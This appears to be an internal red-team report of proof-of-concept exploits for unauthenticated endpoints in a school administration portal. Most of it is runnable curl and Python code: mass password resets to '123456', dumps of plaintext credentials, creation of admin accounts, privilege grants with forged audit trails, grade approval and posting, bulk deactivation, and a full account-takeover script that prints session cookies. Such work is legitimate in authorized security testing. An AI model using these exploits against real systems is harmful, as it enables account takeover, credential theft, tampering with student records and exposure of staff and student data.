# Admin Portal — Proof-of-Concept Exploits
**Date:** June 9, 2026  
**Module:** Administrator / AdminAdmin Portal  
**Reviewer:** Internal Red Team  
**Classification:** Internal Use Only

---

> **Warning:** All PoCs below target unauthenticated endpoints confirmed by route and middleware analysis. Replace `TARGET` with the application base URL. Do not run against production systems without written authorization.

---

## PoC A-01 — Unauthenticated Password Reset (Any Account)
**Finding:** A-01 | **Severity:** CRITICAL | **Middleware:** `cors` only (no auth)

### Vulnerable Code
```php
// FNSAccountController.php line 1210
public static function change_password(Request $request)
{
    $tid = $request->get('tid');   // attacker-controlled email

    DB::table('users')
        ->where('email', $tid)
        ->update([
            'password' => Hash::make('123456'),
            'isDefault' => 1,
        ]);
}
```

### Exploit — Reset a Specific Account
```bash
# Reset any user's password to "123456" — no authentication required
# Substitute the target's email address or TID
curl "http://TARGET/administrator/setup/accounts/updatepass?tid=admin@school.edu"
```

Expected response:
```json
[{"status":1,"message":"Account Reset"}]
```

After this call, login with `admin@school.edu` / `123456` succeeds.

### Exploit — Bulk Reset All Teacher Accounts
```bash
#!/usr/bin/env bash
# First, get the current school year (typically 4 digits)
YEAR=2026
TARGET="http://TARGET"

# Teacher IDs are sequential starting from 0001
for i in $(seq 1 500); do
    TID="${YEAR}$(printf '%04d' $i)"
    curl -s "${TARGET}/administrator/setup/accounts/updatepass?tid=${TID}" \
         -o /dev/null -w "%{http_code} ${TID}\n"
done
```

All teacher accounts reset to `123456` in ~30 seconds.

### Exploit — Reset Admin/Registrar Accounts by Known Email Pattern
```bash
# Known admin email patterns (adjust to target)
for EMAIL in admin registrar finance cashier principal; do
    curl -s "http://TARGET/administrator/setup/accounts/updatepass?tid=${EMAIL}@school.edu"
    echo "Reset attempt: ${EMAIL}@school.edu"
done
```

---

## PoC A-02 — Unauthenticated Plaintext Password Dump
**Finding:** A-02 | **Severity:** CRITICAL | **Middleware:** `cors` only (no auth)

### Vulnerable Code
```php
// FNSAccountController.php list() method
$temp_users = DB::table('users')
    ->select('email', 'passwordstr', 'type', 'password')
    ->get();
// Response includes 'passwordstr' = plaintext stored password
```

### Exploit
```bash
# Dump all active staff accounts with plaintext passwords
curl "http://TARGET/administrator/setup/accounts/list?status=1&length=9999&start=0" \
     | python3 -c "
import sys, json
data = json.load(sys.stdin)
for row in data.get('data', []):
    for u in row.get('user', []):
        if u.get('passwordstr'):
            print(f\"{u['email']}:{u['passwordstr']}\")
"
```

Expected output — one credential per line:
```
20260001:SecureP@ss1
20260002:Welcome123
20260003:teacher2026
...
```

### Python Version (With Pagination)
```python
import requests, json

TARGET = "http://TARGET"
url    = f"{TARGET}/administrator/setup/accounts/list"
start  = 0
chunk  = 100
creds  = []

while True:
    r = requests.get(url, params={"status": 1, "length": chunk, "start": start})
    data = r.json()
    teachers = data.get("data", [])
    if not teachers:
        break
    for t in teachers:
        for u in t.get("user", []):
            if u.get("passwordstr"):
                creds.append((u["email"], u["passwordstr"]))
    start += chunk

for email, pw in creds:
    print(f"{email}:{pw}")
```

---

## PoC A-03 — Unauthenticated Staff Account Creation (Arbitrary User Type)
**Finding:** A-03 | **Severity:** CRITICAL | **Middleware:** `cors` only (no auth)

### Vulnerable Code
```php
// FNSAccountController.php line 618
$teacherid = DB::table('teacher')->insertGetId([
    'usertypeid' => $request->get('utype'),  // attacker controls user type
    // ...
]);
DB::table('users')->insertGetId([
    'type'     => $request->get('utype'),    // maps to usertype.id
    'password' => Hash::make('123456'),
]);
```

### Exploit — Create Account with Highest Privilege Type
```bash
# First, enumerate valid user types (optional — try common values 1-20)
# Then create an account with type=17 (SuperAdmin) or type=6 (Admin)
curl "http://TARGET/administrator/setup/accounts/create/account?\
lname=Attacker\
&fname=Test\
&mname=\
&title=Mr\
&acadtitle=\
&suffix=\
&lcn=\
&utype=6\
&userid=1\
&bdate=1990-01-01\
&gender=M\
&national=1\
&marital=1\
&mobile=09000000000\
&email=attacker@evil.com\
&address=123+Street"
```

Expected response:
```json
[{"status":1,"data":"Created Successfully!"}]
```

Retrieve the generated account TID:
```bash
# The TID is <year><sequential teacher id>
# The most recent teacher ID can be found by checking the list endpoint
curl "http://TARGET/administrator/setup/accounts/list?length=1&start=0&status=1" \
     | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data'][-1]['tid'])"
```

Then login:
```bash
curl -c cookies.txt -b cookies.txt \
     -X POST "http://TARGET/login" \
     -d "email=<generated_TID>&password=123456"
```

---

## PoC A-04 — Unauthenticated Portal Privilege Grant
**Finding:** A-04 | **Severity:** HIGH | **Middleware:** `cors` only (no auth)

### Exploit — Grant Any Portal Access to Any User
```bash
# Grant portal type 17 (SuperAdmin) access to user ID 42
# With forged audit trail pointing to user ID 1 (admin)
curl "http://TARGET/administrator/setup/accounts/update/privilege?\
userid=42\
&usertype=17\
&status=1\
&updateuserid=1"
```

Expected response:
```json
[{"status":1}]
```

### Exploit — Remove Portal Access from Legitimate Admin (DoS)
```bash
# Remove admin portal access from user ID 5
curl "http://TARGET/administrator/setup/accounts/update/privilege?\
userid=5\
&usertype=6\
&status=0\
&updateuserid=99"
```

---

## PoC A-05 — Unauthenticated Mass Account Deactivation
**Finding:** A-05 | **Severity:** HIGH | **Middleware:** `cors` only (no auth)

### Exploit — Deactivate All Teachers
```bash
# Deactivate teachers with IDs 1-500
for i in $(seq 1 500); do
    curl -s "http://TARGET/administrator/setup/accounts/update/active?teacher=${i}&status=0"
done
echo "All teacher accounts deactivated"
```

---

## PoC A-06 — Unauthenticated K-12 Grade Approval and Posting
**Finding:** A-06 | **Severity:** HIGH | **Middleware:** None

### Exploit — Approve and Post Grades Without Authorization
```bash
# Enumerate or guess grade status IDs (typically sequential integers)
GRADE_STATUS_ID=42

# Step 1: Approve the grade batch
curl "http://TARGET/reportcard/grade/status/approve?id=${GRADE_STATUS_ID}"

# Step 2: Post the grade batch to permanent records
curl "http://TARGET/reportcard/grade/status/post?id=${GRADE_STATUS_ID}"
```

Both endpoints have zero middleware — no `auth`, no `isAdmin`, no CSRF. They execute directly.

---

## PoC A-07 — Unauthenticated Database Sync Delete
**Finding:** A-07 | **Severity:** HIGH | **Middleware:** `cors` only (no auth)

### Exploit — Trigger Sync Delete for Teacher Records
```bash
# Batch delete teacher sync records (depending on sync_delete implementation)
curl "http://TARGET/administrator/setup/accounts/syncdelete?teacher=1"
curl "http://TARGET/administrator/setup/accounts/syncdelete?teacher=2"
# ... this maps directly to DB operations with no auth gate
```

---

## PoC A-08 — Unauthenticated AdminAdmin Reports
**Finding:** A-08 | **Severity:** MEDIUM | **Middleware:** None

### Exploit — Retrieve Cash Transaction History
```bash
# Dump all cash transactions — no credentials required
curl "http://TARGET/cashtransaction"

# Dump student master list
curl "http://TARGET/studentmasterlist"

# Dump target collection figures
curl "http://TARGET/targetcollection"
```

---

## PoC A-01 Extended — Full Takeover Automation
Combines A-01 (password reset) and login to achieve full admin access in a single script:

```python
#!/usr/bin/env python3
"""
Admin Portal Full Takeover — combines A-01 unauthenticated password reset with login.
For authorized penetration testing only.
"""
import requests, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"

# Known email patterns to try
candidates = [
    "admin@school.edu",
    "superadmin@school.edu",
    "registrar@school.edu",
    "principal@school.edu",
]

s = requests.Session()

for email in candidates:
    # Step 1: Reset password (no auth required)
    r = requests.get(f"{TARGET}/administrator/setup/accounts/updatepass",
                     params={"tid": email})
    result = r.json()
    if result[0].get("status") == 1:
        print(f"[+] Password reset successful: {email}")

        # Step 2: Fetch CSRF token
        login_page = s.get(f"{TARGET}/login")
        import re
        token = re.search(r'_token.*?value="([^"]+)"', login_page.text)
        if not token:
            print("[!] Could not extract CSRF token, attempting anyway...")
            csrf = ""
        else:
            csrf = token.group(1)

        # Step 3: Login
        login = s.post(f"{TARGET}/login", data={
            "_token": csrf,
            "email": email,
            "password": "123456",
        })

        if "dashboard" in login.url or login.status_code == 200:
            print(f"[+] Login SUCCESS as {email}")
            print(f"[+] Session cookies: {dict(s.cookies)}")
            break
    else:
        print(f"[-] {email} not found or reset failed")
```

---

*End of Admin Portal PoC*
